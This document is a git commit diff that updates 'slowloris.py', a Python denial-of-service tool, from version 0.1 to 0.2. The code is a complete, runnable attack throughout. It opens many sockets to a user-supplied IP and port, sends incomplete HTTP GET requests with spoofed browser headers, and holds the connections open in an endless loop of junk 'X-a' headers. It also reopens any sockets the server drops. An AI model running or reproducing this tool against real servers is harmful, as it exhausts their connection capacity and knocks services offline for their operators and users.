cd0e44b13d3f4bed9bfd704ac09f9e08f998ed07
casperberg <casperberg@msn.com>
2017-07-21 01:27:27 +0200

    0.2

--- slowloris.py
+++ slowloris.py
@@ -3,63 +3,56 @@
 from socket import socket, AF_INET, SOCK_STREAM, error
 from random import randint
 from time import sleep
-from sys import argv
+from sys import argv, exit
 from progress.counter import Counter, Countdown
+from progress.bar import PixelBar
 from ANSI import *
 
-version = ' 0.1'
-regular_headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-  "Accept-language: en-US,en,q=0.5"]
+version = ' 0.2'
+headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Accept-language: en-US,en,q=0.5"]
 
 with open('ascii.txt') as file:
   loris = file.read()
-
 print(SCREENC, loris, '\nversion:'+version,'\n')
 
 def init(ip, port):
-  s = socket(AF_INET, SOCK_STREAM)
-  s.settimeout(4)
-  s.connect((ip, int(port)))
-  s.send("GET /?{} HTTP/1.1\r\n".format(randint(0,2000)).encode('UTF-8'))
-  for header in regular_headers:
-    s.send('{}\r\n'.format(header).encode('UTF-8'))
-  return s
+  soc = socket(AF_INET, SOCK_STREAM)
+  soc.settimeout(4)
+  soc.connect((ip, int(port)))
+  soc.send('GET /?{} HTTP/1.1\r\n'.format(randint(0,2400)).encode('utf-8'))
+  for header in headers: soc.send('{}\r\n'.format(header).encode('utf-8'))
+  return soc
 
-def main():
+if __name__ == '__main__':
   if len(argv)<5:
-    print(REDC+"Usage: {} ip port count time".format(argv[0]))
-    return
+    exit(REDC+"Usage: {} ip port count time".format(argv[0]))
   ip = argv[1]
   port = argv[2]
-  socket_count = int(argv[3])
-  socket_list = []
-  bar = Counter(GREENC+'Creating Sockets: '+YELLOWC, max=socket_count)
+  count = int(argv[3])
   timer = int(argv[4])
+  socketList = []
 
-  for _ in range(socket_count):
-    try:
-      s=init(ip, port)
-    except error:
-      break
-    socket_list.append(s)
+  bar = Counter(GREENC+'Creating sockets: '+YELLOWC, max=count)
+  for _ in range(count):
+    try: soc=init(ip, port)
+    except error: break
+    socketList.append(soc)
     bar.next()
-  print('\n')
+
+  print()
   while True:
-    print(GREYC+"Sending Headers")
-    for s in socket_list:
-      try:
-        s.send('X-a {}\r\n'.format(randint(1,5000)).encode('utf-8'))
-      except error:
-        socket_list.remove(s)
-    for _ in range(socket_count - len(socket_list)):
-      rebar = Countdown(PURPLEC+"\nRe-creating Socket: "+REDC, max=socket_count - len(socket_list))
-      try:
-        s=init(ip, port)
-        if s:
-          socket_list.append(s)
-      except error:
-        break
-      rebar.next()
-    sleep(timer)
-if __name__=='__main__':
-  main()
+    sendbar = PixelBar(GREYC+'Sending keep-alive Headers'+REDC, max=timer)
+    
+    for soc in socketList:
+      try: soc.send('X-a {}\r\n'.format(randint(1,4800)).encode('utf-8'))
+      except error: socketList.remove(soc)
+
+    for _ in range(count - len(socketList)):
+      try: 
+        soc=init(ip, port)
+        if soc: socketList.append(soc)
+      except error: break
+    
+    for t in range(timer):
+      sleep(1); sendbar.next()
+    sendbar.start()
